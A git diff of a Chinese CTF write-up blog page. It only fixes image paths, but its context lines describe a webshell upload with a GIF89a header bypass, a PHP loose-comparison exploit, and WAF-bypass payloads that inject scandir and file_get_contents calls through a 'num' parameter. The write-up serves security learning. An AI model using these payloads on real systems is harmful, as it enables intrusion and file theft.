@@ -511,8 +511,8 @@
 <li><p>GIF89a 图片头文件欺骗 <a href="https://blog.csdn.net/piaolankeke/article/details/5872876" target="_blank" rel="noopener">https://blog.csdn.net/piaolankeke/article/details/5872876</a></p>
 </li>
 </ol>
-<p>接下来就是上传了<br><img src="/images/BUUCTF%5CCheckIn/0.png" alt="avatar"></p>
-<p><img src="/images/BUUCTF%5CCheckIn/1.png" alt="avatar"></p>
+<p>接下来就是上传了<br><img src="/images/BUUCTF/CheckIn/0.png" alt="avatar"></p>
+<p><img src="/images/BUUCTF/CheckIn/1.png" alt="avatar"></p>
 <p>接下来用菜刀getshell</p>
 <p>得到flag</p>
 <p>这里还有一种GET型的一句话木马<br>步骤与之前差不多</p>
@@ -665,8 +665,8 @@
 <p>首先 访问 /robots.txt 或者 /.git/ 发现 Git 仓库可以 GitHack 拿到源码<br>漏洞在 api.php</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  $money = $_SESSION[&apos;money&apos;];</span><br><span class="line">$numbers = $req[&apos;numbers&apos;];</span><br><span class="line">$win_numbers = random_win_nums();</span><br><span class="line">$same_count = 0;</span><br><span class="line">for($i=0; $i&lt;7; $i++)&#123;</span><br><span class="line">    if($numbers[$i] == $win_numbers[$i])&#123;</span><br><span class="line">        $same_count++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>没什么思路 注册一个账号 随便输入7个数字 抓包<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%5Clottery/0.png" alt="avatar"></p>
-<p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%5Clottery/1.png" alt="avatar"></p>
+<p>没什么思路 注册一个账号 随便输入7个数字 抓包<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/lottery/0.png" alt="avatar"></p>
+<p>使用 PHP 弱类型松散比较，以”1”为例，和TRUE,1,”1”相等<br><img src="/images/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/lottery/1.png" alt="avatar"></p>
 <p>多发几次包  钱够了 买flag</p>
 <p>得到flag</p>
 
@@ -831,7 +831,7 @@
 <p>所以在num变量前加个空格来让WAF识别不到  并且用char()进行转义</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
 
-<p><img src="/images/BUUCTF%5CEasy_Calc/0.png" alt="avatar"></p>
+<p><img src="/images/BUUCTF/Easy_Calc/0.png" alt="avatar"></p>
 <p>找到flagg目录</p>
 <p>那就继续读取 使用file_get_contents</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span><br></pre></td></tr></table></figure>
